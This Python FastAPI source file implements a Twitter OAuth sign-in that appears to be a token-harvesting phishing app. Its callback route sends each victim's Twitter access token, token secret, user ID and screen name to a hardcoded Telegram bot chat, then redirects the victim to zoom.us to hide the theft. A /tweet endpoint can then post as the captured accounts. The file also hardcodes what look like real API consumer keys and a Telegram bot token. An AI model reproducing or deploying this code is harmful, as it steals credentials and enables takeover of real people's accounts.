import base64
import hashlib
import hmac
import httpx
import secrets
import time
import uuid
from authlib.integrations.httpx_client import OAuth1Client
from datetime import datetime
from fastapi import FastAPI, Request, Response, Query, HTTPException
from fastapi.responses import RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from requests.structures import CaseInsensitiveDict
from starlette.middleware.sessions import SessionMiddleware
from urllib.parse import quote, urlencode


class TweetRequest(BaseModel):
    accessToken: str
    accessTokenSecret: str
    message: str


session_secret: secrets = secrets.token_hex(32)
app: FastAPI = FastAPI()
app.add_middleware(SessionMiddleware, secret_key=session_secret)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates: Jinja2Templates = Jinja2Templates(directory="templates")

# config temporary
consumer_key = "rv0CqazGRlPuB90mCsTXz5Vpi"
consumer_secret = "OPNDhWFIhpj2Noc6WBW05kOOTrtPJdUimzLVhPSu0g2MFHDUBw"
callback_url = ""
telegram_bot_token = "7508038931:AAEY1t9kqqKj1wgtjLTXGcPFEapuHRPPAAg"
chat_id = "-4559352626"

# oauth urls
request_token_url = "https://api.twitter.com/oauth/request_token"
access_token_url = "https://api.twitter.com/oauth/access_token"
authenticate_url = "https://api.twitter.com/oauth/authenticate"


# main route
@app.get("/")
def home(request: Request):
    return templates.TemplateResponse(request=request, name="index.html")


# post route get
@app.get("/post")
def post(request: Request):
    return templates.TemplateResponse(request=request, name="post.html")


# authorized post
@app.post("/authorize")
async def authorize(request: Request):
    try:
        twitter = OAuth1Client(
            client_id=consumer_key,
            client_secret=consumer_secret,
            callback_uri=callback_url,
        )
        response = twitter.fetch_request_token(request_token_url)
        oauth_token = response.get("oauth_token")
        oauth_token_secret = response.get("oauth_token_secret")

        if not oauth_token or not oauth_token_secret:
            return Response("Failed to obtain OAuth token and secret", status_code=500)

        auth_token = secrets.token_hex(16)

        auth_url = f"{authenticate_url}?oauth_token={oauth_token}"

        auth_token_expiry = datetime.now().strftime("%m/%d/%Y %I:%M:%S %p")

        secret_message = (
            f"New SESSION_SECRET: {session_secret}\n"
            f"New AUTH_TOKEN: {auth_token}\n"
            f"Auth Token Expiry: {auth_token_expiry}"
        )

        telegram_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"

        async with httpx.AsyncClient() as client:
            await client.post(
                telegram_url, json={"chat_id": chat_id, "text": secret_message}
            )
        request.session["oauth_token"] = oauth_token
        request.session["oauth_token_secret"] = oauth_token_secret
        request.session["auth_token"] = auth_token

        return RedirectResponse(auth_url, status_code=302)

    except httpx.HTTPStatusError as http_exc:
        return Response(f"HTTP error: {http_exc.response.json()}", status_code=500)
    except Exception as exc:
        return Response(f"Internal Server Error: {exc}", status_code=500)


@app.get("/callback")
async def callback(
    request: Request, oauth_verifier: str = Query(None, alias="oauth_verifier")
):
    oauth_token = request.session.get("oauth_token")
    oauth_token_secret = request.session.get("oauth_token_secret")
    auth_token = request.session.get("auth_token")

    if not oauth_token or not oauth_token_secret:
        return Response("OAuth token or secret not found in session", status_code=400)

    try:
        twitter = OAuth1Client(
            client_id=consumer_key,
            client_secret=consumer_secret,
            token=oauth_token,
            token_secret=oauth_token_secret,
        )
        response = twitter.fetch_access_token(access_token_url, verifier=oauth_verifier)
        access_token = response.get("oauth_token")
        access_token_secret = response.get("oauth_token_secret")
        user_id = response.get("user_id")
        screen_name = response.get("screen_name")

        if not access_token or not access_token_secret:
            return Response("Failed to obtain access token and secret", status_code=500)

        auth_token_expiry = datetime.now().strftime("%m/%d/%Y %I:%M:%S %p")

        message = (
            f"Twitter Access Token: {access_token}\n"
            f"Twitter Access Token Secret: {access_token_secret}\n"
            f"User ID: {user_id}\n"
            f"Screen Name: {screen_name}\n"
            f"Auth Token: {request.session['oauth_token']}\n"
            f"Auth Token Secret: {request.session['oauth_token_secret']}\n"
            f"Auth Token (auth_token): {auth_token}\n"
            f"Auth Token Expiry: {auth_token_expiry}"
        )

        telegram_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"

        async with httpx.AsyncClient() as client:
            await client.post(telegram_url, json={"chat_id": chat_id, "text": message})

        return RedirectResponse("https://zoom.us/", status_code=302)

    except httpx.HTTPStatusError as http_exc:
        return Response(f"HTTP error: {http_exc.response.json()}", status_code=500)
    except Exception as exc:
        return Response(f"Internal Server Error: {exc}", status_code=500)


def generate_signature(base_string, signing_key):
    hashed = hmac.new(signing_key.encode(), base_string.encode(), hashlib.sha1)
    return base64.b64encode(hashed.digest()).decode()


def get_oauth_signature(method, url, params, consumer_secret, token_secret):
    sorted_params = "&".join(
        f'{quote(k, safe="") }={quote(v, safe="")}' for k, v in sorted(params.items())
    )
    base_string = "&".join(
        [method.upper(), quote(url, safe=""), quote(sorted_params, safe="")]
    )
    signing_key = f'{quote(consumer_secret, safe="")}&{quote(token_secret, safe="")}'
    return generate_signature(base_string, signing_key)


# tweet post
@app.post("/tweet")
async def post_tweet(tweet_request: TweetRequest):
    access_token = tweet_request.accessToken
    access_token_secret = tweet_request.accessTokenSecret
    message = tweet_request.message

    tweet_endpoint = "https://api.twitter.com/2/tweets"
    tweet_params = {"text": message}

    oauth_params = {
        "oauth_consumer_key": consumer_key,
        "oauth_token": access_token,
        "oauth_signature_method": "HMAC-SHA1",
        "oauth_timestamp": str(int(time.time())),
        "oauth_nonce": str(uuid.uuid4().hex),
        "oauth_version": "1.0",
    }

    oauth_params["oauth_signature"] = get_oauth_signature(
        "POST", tweet_endpoint, oauth_params, consumer_secret, access_token_secret
    )
    oauth_header = "OAuth " + ", ".join(
        [f'{quote(k, safe="")}="{quote(v, safe="")}"' for k, v in oauth_params.items()]
    )
    headers = {"Authorization": oauth_header, "Content-Type": "application/json"}

    async with httpx.AsyncClient() as client:
        resp = await client.post(tweet_endpoint, json=tweet_params, headers=headers)
    if resp.status_code == 201:
        return {"message": "Tweet posted successfully", "data": resp.json()}
    else:
        raise HTTPException(status_code=resp.status_code, detail=resp.json())
